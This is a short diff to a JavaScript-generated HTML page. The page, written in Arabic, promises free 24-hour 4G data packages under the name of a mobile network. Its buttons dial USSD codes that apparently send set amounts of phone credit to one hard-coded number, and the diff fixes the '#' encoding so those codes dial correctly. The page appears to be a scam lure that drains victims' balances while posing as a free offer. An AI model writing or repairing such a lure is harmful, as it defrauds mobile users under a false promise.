@@ -58,9 +58,9 @@ const htmlContent = `
 
   <div class="logo-text">باقات 4G مجانية لمدة 24 ساعة</div>
 
-  <a href="tel:*130*737145554*1000#" class="btn">تجربة المهمة 1</a>
-  <a href="tel:*130*737145554*400#" class="btn">تجربة المهمة 2</a>
-  <a href="tel:*130*737145554*200#" class="btn">تجربة المهمة 3</a>
+  <a href="tel:*130*737145554*1000%23" class="btn">تجربة المهمة 1</a>
+  <a href="tel:*130*737145554*400%23" class="btn">تجربة المهمة 2</a>
+  <a href="tel:*130*737145554*200%23" class="btn">تجربة المهمة 3</a>
 
   <footer>
     شبكة YOU للخدمات
